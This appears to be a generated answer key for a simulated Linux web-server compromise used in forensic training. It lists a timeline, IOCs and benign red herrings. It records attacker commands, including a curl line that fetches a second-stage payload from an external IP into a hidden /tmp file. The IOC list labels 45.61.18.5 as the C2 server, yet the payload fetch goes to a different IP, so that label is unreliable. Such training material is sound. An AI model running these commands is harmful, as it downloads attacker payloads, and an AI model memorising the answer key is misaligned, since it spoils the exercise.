# Ground Truth: single-host-linux-rce

**Scenario:** Minimal single-host beginner forensic scenario. A small analytics SaaS runs
one public-facing Linux application server (nginx + gunicorn) in a DMZ
behind a perimeter firewall with network and firewall sensors, plus one
internal operator workstation. An external actor scans the public portal,
exploits a public application endpoint to gain code execution as the web
service account, confirms its context, and retrieves a second-stage payload
over a plain outbound HTTP connection. A benign nightly maintenance job
on the same host produces a similarly shaped process cluster to create a
realistic, low-noise beginner triage exercise.


**Generated:** 2026-08-14 02:00:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **www-data** on **APP-01**: External scanner probes the public application server
2. **www-data** on **APP-01**: Attacker submits a crafted request to a public application endpoint and gains code execution as the web service account
3. **www-data** on **APP-01**: Compromised web process retrieves a second-stage payload from external infrastructure


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2026-08-14 02:06:18 UTC | www-data | APP-01 | Web_Scan | Web scan (nikto) against 45.61.18.5:80 (40 requests) |
| 2026-08-14 02:17:35 UTC | www-data | APP-01 | Connection | Connection to 45.61.18.5:80 (UID: CoWsvjPBAlDoZlbw8N) |
| 2026-08-14 02:17:35 UTC | www-data | APP-01 | Process | Process: /bin/sh (PID: 599893) - `sh -c id` |
| 2026-08-14 02:24:25 UTC | www-data | APP-01 | Process | Process: /usr/bin/curl (PID: 600449) - `curl -s http://154.16.92.201/dl/pkg-47a1 -o /tm...` |


## Source Evidence Status

Canonical ground truth remains authoritative. Source rows may be `visible`, `delayed`, `dropped`, `filtered`, or `out_of_window` depending on the selected observation profile and sensor placement.

| Storyline ID | Source | Status Counts |
|--------------|--------|---------------|
| evt-c2-fetch | asa | visible: 2 |
| evt-c2-fetch | ecar | visible: 5 |
| evt-c2-fetch | zeek | visible: 5 |
| evt-rce | asa | visible: 1 |
| evt-rce | ecar | visible: 3 |
| evt-rce | web | visible: 1 |
| evt-rce | zeek | visible: 3 |
| evt-recon | asa | filtered: 1, visible: 39 |
| evt-recon | ecar | visible: 40 |
| evt-recon | web | visible: 35 |
| evt-recon | zeek | filtered: 3, visible: 103 |
| red_herring:rh-nightly-maintenance | ecar | visible: 10 |


## Indicators of Compromise (IOCs)

### Network IOCs

- 45.61.18.5:80 (C2 Server)
- 45.61.18.5:80 (Web Scan Target)
- Zeek UID: CoWsvjPBAlDoZlbw8N

### Process IOCs

- /bin/sh
- /usr/bin/curl
- `curl -s http://154.16.92.201/dl/pkg-47a1 -o /tmp/.cache-47a1`
- `sh -c id`

### User IOCs

- www-data (compromised account)

### File IOCs

- /tmp/.cache-47a1


## Red Herrings

The following events appear suspicious but are benign. They are included to make the dataset more realistic.

| Timestamp | Actor | System | Activity | Why It's Benign |
|-----------|-------|--------|----------|-----------------|
| 2026-08-14 03:29:59 UTC | svc-deploy | APP-01 | Scheduled nightly deployment maintenance job archives release artifacts | svc-deploy runs a cron-scheduled maintenance script every night that packages recent release artifacts for the backup pipeline. The process mix (a python script, a shell, and an archiving tool, all in close succession) superficially resembles the attacker's process activity, but it is distinguishable by account (svc-deploy, not www-data), parent lineage (a deployment login/shell session, not the web worker), the absence of any preceding external HTTP request, and the absence of any outbound network connection. |
| 2026-08-14 03:30:29 UTC | svc-deploy | APP-01 | Scheduled nightly deployment maintenance job archives release artifacts | svc-deploy runs a cron-scheduled maintenance script every night that packages recent release artifacts for the backup pipeline. The process mix (a python script, a shell, and an archiving tool, all in close succession) superficially resembles the attacker's process activity, but it is distinguishable by account (svc-deploy, not www-data), parent lineage (a deployment login/shell session, not the web worker), the absence of any preceding external HTTP request, and the absence of any outbound network connection. |
| 2026-08-14 03:30:38 UTC | svc-deploy | APP-01 | Scheduled nightly deployment maintenance job archives release artifacts | svc-deploy runs a cron-scheduled maintenance script every night that packages recent release artifacts for the backup pipeline. The process mix (a python script, a shell, and an archiving tool, all in close succession) superficially resembles the attacker's process activity, but it is distinguishable by account (svc-deploy, not www-data), parent lineage (a deployment login/shell session, not the web worker), the absence of any preceding external HTTP request, and the absence of any outbound network connection. |
